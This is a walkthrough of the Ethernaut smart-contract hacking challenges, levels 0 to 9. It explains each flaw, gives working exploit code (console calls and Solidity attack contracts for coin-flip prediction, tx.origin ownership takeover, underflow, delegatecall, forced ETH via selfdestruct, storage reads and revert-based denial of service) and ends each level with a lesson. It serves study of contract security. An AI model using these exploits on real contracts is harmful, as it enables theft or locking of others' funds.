# Solutions to the Ethernaut challenges

This repo is all about me solving the ethernaut challenges and giving you hints on how to solve thewm yourselves.

## 0. Hello Ethernaut

The goal of this level is to get fmiliar with how to interact with the current instance through the developer console. We can type in a few keywords to interact with the contract, hint: typeawait contract.password(). and you can try this too "await contract.info()".

## 1. Fallback

This is practically the first challenge and the main aim of this level is that we become the owner and reduce the balance of the contract to 0.

Note that there are only two types of accounts on Ethereum: Externally Owned Accounts (EOAs) and Smart Contract accounts. EOAs are basically user wallet addresses and they represent users interacting with Ethereum. Smart Contract accounts are accounts owned by contracts.
Let's start by figuring out how to become the owner. If you look at the contract code, the only feasible way of becoming the owner is to trigger the `receive` function. There is a `require` statement that needs to pass so we will call the `contribute` function and specify any value less than 0.001 ETH.

Thereafter we will initiate a plain ETH transfer into the contract to become the owner. To complete the second requirement, we will call the `withdraw` function to withdraw the funds out.

```
await contract.contribute({value: 1437});
await contract.send({value: 1437});
await contract.withdraw();
```

KEY NOTE FROM CHALLENGE:

We can send money to a Smart Contract using its fallback function (a function with no name); however, the preferred way of programming a contract to receive Ether is by adding the receive() function.

## 2. Fallout

After this challenge, we understand what an ABI (Application Binary Interface) is . I like to think of it as the public API of a Smart Contract that you can interact with from a JavaScript front-end.
In earlier versions of solidity, the constructor of a contract is defined by a function with the same name as the contract i.e. if your contract name is `Treat`, the name of your constructor needs to be `Treat` as well.

From solidity 0.5.0, this is no longer the case but we should take note here — contracts can have malicious functions that are hidden in plain sight. In this ethernaut level, the function `Fal1out` is spelt incorrectly. It is very easy to miss out on this when skimming through the code.

To become the owner, we just call the `Fal1out` function.

```
await contract.Fal1out({value: 1437});
```

## 3. Coinflip

We learn some cool things in this challenge. Like, how _not_ to introduce randomness into our Smart Contracts.

The goal of this level is to guess the `side` correctly 10 times in a row. The chance of this happening is 0.5^10 or 0.0009765625% which _might_ happen but very very unlikely. Luckily for us, the contract has a flaw with their flipping algorithm, specifically relying on `block.number` as a form of randomness.
Note that generating randomness in computing is generally difficult (if not impossible). It's even more difficult in Smart Contracts because everyone can read our contract code (provided we've published the source code which we will always be expected to do).
So someone with the wrong intent or smart as some would say can always calculate the correct answer if they run the same algorithm in their attack function before calling your flip function.
If we deploy the following contract on remix and call the `attack` function, we can take over the victim contract.

```
pragma solidity ^0.8.0;

contract CoinflipAttack {
    address victim = 0x9010BCEbf802A031eabB52B22F3ec1331D923bBd;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        // Below is the same algorithm that is used by the victim contract
        // We calculate the value for side before calling the victim contract.
        // Note that will always be correct since both functions are called in the same block.
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        // Normally we would use import the contract here so that we can call the function directly, but this works as well.
        // This approach is useful for when we don't have access to the source code of the contract we want to interact with.
        bytes memory payload = abi.encodeWithSignature("flip(bool)", side);
        (bool success, ) = victim.call{value: 0 ether}(payload);
        require(success, "Transaction call using encodeWithSignature is successful");
    }
}
```

MAIN LESSON FROM CHALLENGE:
If there is a need to introduce randomness into our contract, we use a decentralized oracle to compute random numbers. That's because there's no native way in Solidity to generate a random number. And everything you write in a Smart Contract is publicly visible, including local and state variables marked as private.

## 4. Telephone

Here we learn the nuance between using the global variables "tx.origin" and "msg.sender". And we also learn the proper way to do authorization checks in our contract functions.
The way to hack this level is to understand how tx.origin works. When we call a contract (A) function from within another contract (B), the msg.sender is the address of B, not the account that initiated the function from which is tx.origin.
Using the following contract on remix and calling the `hackContract` function to take over the victim contract, dont forget that we need to copy and paste the code to this level to remix inorder to be able to import it and successfully hack the level

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './Telephone.sol';

contract TelephoneHack {
    Telephone tellContract;
    constructor(address _address) public {
        tellContract = Telephone(_address);
    }
    function hackContract(address _address) public {
        tellContract.changeOwner(_address);
    }
}
```

MAIN LESSON FROM CHALLENGE:
We should never use tx.origin for authorization in the functions of our contracts.

## 5. Token

In this level, we are going to dive a bit into arithmetic operations in Solidity and also how numbers are stored in solidity memory, also with this we see what can go wrong if we make a mistake when perfoming arithmetic operations in solidity.
But with the release of Solidity v0.8 we don't have to use Open Zeppelin's SafeMath library for arithmetic operations anymore! SafeMath is now automatically integrated into our contracts when we set the pragma directive to 0.8 and above. With this upgrade to Solidity, our code will automatically revert on overflows and underflows.

To become the owner of this contract, we just need to pass a value > 20 since the condition in the first require statement will underflow and therefore will always pass.
balances[msg.sender] -= \_value; This is where we can trigger an arithmetic underflow and we use the transfer function to hack this smart contract
So we just get a random ETH address and then pass it 20 + 1 tokens since we are the msg.sender and we have just 20 tokens, the tx goes through but we end up with more than 20 cause of the underflow.

```
await contract.transfer(instance, 21)
```

## 6. Delegation

Delegate in itself basically means to entrust a task or responsibility to someone else.
DelegateCall means you take the implementation logic of the function in the contract you're making this call to but using the storage of the calling contract.
The delegatecall function should only be used with extreme care because it's particularly risky. Side note, it's been used as an attack vector on a lot of historic hacks including The Parity Wallet Hack which allowed an attacker to steal over ~$30,000,000 USD.
So main key here is to get a function signature for the pwn function, and we can do this by using the sha 3 web 3 tool, which we get by creating the variable of the pwnFunctionSignature
By using
var pwnFuncSignature = web3.utils.sha3("pwn()")
And then we pass the data and key for our pwnfuncsignature using
contract.sendTransaction({data: pwnFuncSignature})
So now we check the contract owner once again and we see that it’s being changed to us.

```
var pwnFuncSignature = web3.utils.sha3("pwn()")

contract.sendTransaction({data: pwnFuncSignature})
```

MAIN LESSON FROM CHALLENGE:
When we use delegatecall, we're reusing another contract's code but also giving it access to our contract's state variables. Because delegates have complete access to the contract's state, use with extreme caution because delegatecall is risky and has been used as an attack vector before.!

## 7. Force

We all know that there are afew ways to send ether to a contract, we can do this by:

1. adding a fallback function (a function with no name) that's modified as "payable"
2. adding a receive() function
3. adding a function and specifying it with the "payable" keyword

But if none of the above are added to the code of a contract, there is still one additional technique that can be used to forcefully send ETH to a contract through the use of `selfdestruct`. deploying this contract through remix, also don't forget to specify value before deploying the ForceAttack contract or the `selfdestruct` won't be able to send any ETH over as there are no ETH in the contract to be sent over!

```
pragma solidity ^0.4.0;

contract ForceAttack {
    constructor () public payable {

    }
    function attack (address _contractAddr) public {
        selfdestruct(_contractAddr);
    }
}
```

MAIN TAKEAWAY FROM CHALLENGE:

If a Smart Contract is not programmed to receive Ether, there's still a way we can force money into it. We write a separate contract that self destructs by calling the global selfdestruct() function which takes an address as a parameter. And right before our contract self destructs, it sends the specified address all of its remaining balance!

## 8. Vault

Here we mostly learn about about storage on smart contracts and also how we can access a variable by its index in a smart contract.
If we try accesing the private variables via another contract then they are private but the problem is that everything on the blockchain is visible so even if the variable's visibility is set to private, anyone can still access it based on its index in the smart contract.

```
const password = await web3.eth.getStorageAt(instance, 1);
await contract.unlock(password);
```

MAIN TAKEAWAY FROM CHALLENGE:
Data on a blockchain is never confidential, and that's because contracts store their data in their designated storage on Ethereum which anyone can query!

## 9. King

This level of the challenge is going to show us how a once popular Ponzi Scheme on Ethereum - King Of The Ether - got hacked.
This is an example of DDoS with unexpected revert when the logic of the victim's contract involve sending funds to the previous "lead", which in this case is the king. Someone with bad intention can just create a smart contract with either:

- a `fallback` / `receive` function that does `revert()`
- or the absence of a `fallback` / `receive` function

Since the global variable msg.sender can represent either an Externally Owned Account (a.k.a. user wallet with private key) or Smart Contract Account, once a malicious user uses the smart contract to take over the "king" position, all funds in the victim's contract is effectively stuck in there because nobody can take over as the new "king" no matter how much ether they use because the fallback function in the victim's contract will always fail when it tries to do `king.transfer(msg.value);`

```
pragma solidity ^0.8.0;

contract KingAttack {

    constructor(address _victimAddress) payable {
        _victimAddress.call{value: 10000000000000000 wei}("");
    }

    receive() external payable {
        revert();
    }
}
```
